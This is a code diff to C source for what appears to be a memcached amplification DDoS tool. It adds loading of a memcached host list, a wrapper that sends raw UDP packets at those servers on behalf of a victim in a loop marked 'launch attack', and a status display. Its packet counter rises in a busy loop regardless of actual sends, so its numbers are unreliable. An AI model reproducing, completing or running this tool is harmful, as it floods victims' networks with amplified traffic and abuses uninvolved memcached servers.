@@ -16,6 +16,7 @@
 #include <netinet/ip.h>
 #include <netinet/udp.h>
 #include <arpa/inet.h>
+#include <math.h>//pow
 
 #ifdef __APPLE__
 #define iphdr ip
@@ -23,12 +24,13 @@
 
 
 uint64_t MAX_PSIZE;
-
+slist* _hosts;
 unsigned short csum (unsigned short *buf, int nwords)
 {
     unsigned long sum = 0;
-    for (sum = 0; nwords > 0; nwords--)
+    for (sum = 0; nwords > 0; nwords--){
         sum += *buf++;
+    }
     sum = (sum >> 16) + (sum & 0xffff);
     sum += (sum >> 16);
     return (unsigned short)(~sum);
@@ -92,6 +94,7 @@ void _memcrashed_ddos(char *target,int port,slist *hosts){
         die("Failed to open socket!");
     }
     memset(datagram, 0, MAX_PSIZE);
+    init_rand((uint32_t)time(NULL));
     init_ip(iph, target);
     init_udp(udph, port);
 #ifdef __APPLE__
@@ -100,7 +103,7 @@ void _memcrashed_ddos(char *target,int port,slist *hosts){
     udph->source=randport();
 #endif
     _node* cur=nth_slist(hosts,randrange(0, (int)hosts->length));
-    for(;;){//launch attack
+    while (__run){//launch attack
         char* __ip=cur->val;
         in_addr_t _ip=inet_addr(__ip);
         struct sockaddr_in t;
@@ -128,10 +131,44 @@ void _memcrashed_ddos(char *target,int port,slist *hosts){
             sleep_ms(dos_sleep);
         }
     }
+    free(target);
+    free_slist(hosts);
+    free(iph);
+    free(udph);
 }
-void memcrashed_ddos(_dos_param _p){
-    
+void memcrashed_init(char* hostfile){
+    FILE* fp=fopen(hostfile, "r");
+    if(!fp){
+        die("Failed to open file:%s(%d)",strerror(errno),errno);
+    }
+    _hosts=create_slist();
+    char *line = NULL;
+    size_t len = 0;
+    ssize_t read;
+    while ((read = getline(&line, &len, fp)) != -1) {
+        add_slist(_hosts, line);
+    }
+    if(line){
+        free(line);
+    }
+}
+void memcrashed_ddos(_dos_param* _p){//wrapper
+    assert(_p->mode==MODE_MEMCRASHED);
+    if(!_hosts){
+        die("Programming error:variable _hosts unitiallized here!(%s:%d)",__FILE__,__LINE__);
+    }
+    _memcrashed_ddos(_p->host, _p->port, _hosts);
 }
 void memcrashed_status(){
-    
+    success("Status:");
+    success("Hit ^C to exit");
+    const char * metrics_str=metrics2str(metrics);
+    for (;;) {
+        if (!__run) {
+            
+            break;
+        }
+        success_n("Total packets sent to memcached servers:%.2f%s",psent,metrics_str);
+        psent+=MAX_PSIZE/pow(1024.0,metrics);
+    }
 }
